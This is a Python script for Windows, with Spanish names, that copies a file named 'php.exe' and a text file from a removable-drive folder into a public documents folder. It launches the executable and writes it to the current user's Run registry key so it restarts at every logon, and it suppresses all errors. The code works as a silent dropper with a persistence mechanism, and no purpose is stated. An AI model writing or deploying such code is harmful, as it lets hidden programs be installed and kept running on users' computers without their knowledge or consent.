import os
import shutil
import winreg
import sys

def copiar_archivos(origenes, destino):
    try:
        os.makedirs(destino, exist_ok=True)
        for archivo in origenes:
            nombre_archivo = os.path.basename(archivo)
            destino_completo = os.path.join(destino, nombre_archivo)
            if os.path.exists(archivo):
                if os.path.isdir(archivo):
                    shutil.copytree(archivo, destino_completo)
                else:
                    shutil.copy(archivo, destino_completo)
        return True
    except Exception as e:
        return False

def abrir_archivo(archivo_a_abrir):
    try:
        os.startfile(archivo_a_abrir)
        return True
    except Exception as e:
        return False

def agregar_al_inicio(nombre_entrada, ruta_programa):
    if not os.path.exists(ruta_programa):
        return
    clave = winreg.HKEY_CURRENT_USER
    ruta_registro = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with winreg.OpenKey(clave, ruta_registro, 0, winreg.KEY_WRITE) as key:
        winreg.SetValueEx(key, nombre_entrada, 0, winreg.REG_SZ, ruta_programa)

if __name__ == "__main__":
    archivos_a_copiar = [
        r"E:\llave\php.exe",
        r"E:\llave\proximos_proyectos.txt"
    ]
    carpeta_destino = r"C:\Users\Public\Documents\proyectos"
    archivo_a_abrir = r"C:\Users\Public\Documents\proyectos\php.exe"
    nombre_registro = "php"
    ruta_registro = archivo_a_abrir

    # Ejecutar
    if copiar_archivos(archivos_a_copiar, carpeta_destino):
        if abrir_archivo(archivo_a_abrir):
            agregar_al_inicio(nombre_registro, ruta_registro)
